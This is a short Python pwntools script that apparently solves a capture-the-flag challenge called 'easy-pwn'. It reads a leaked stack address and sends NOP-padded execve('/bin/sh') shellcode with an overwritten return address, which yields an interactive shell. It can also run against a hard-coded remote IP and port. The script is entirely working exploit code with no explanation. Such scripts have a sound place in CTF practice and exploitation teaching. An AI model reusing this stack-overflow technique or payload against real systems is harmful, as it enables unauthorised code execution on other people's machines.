#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./easy-pwn", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc 103.185.44.122 15118"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
sc = asm(shellcraft.amd64.linux.execve("/bin/sh", 0, 0))

io = start()

io.sendlineafter(b">> ", b"1")
stack_leak = int(
    io.recvuntil(
        b"x213i9u281ejnsdand0xx2318231789314nsx",
        drop=True))
log.info(f"{stack_leak=:#x}")

payload = sc
payload = payload.ljust(0x70, b"\x90")
payload += flat(
    elf.bss(0xc00),
    stack_leak,
)
io.sendlineafter(b"Username: ", payload)

io.interactive()
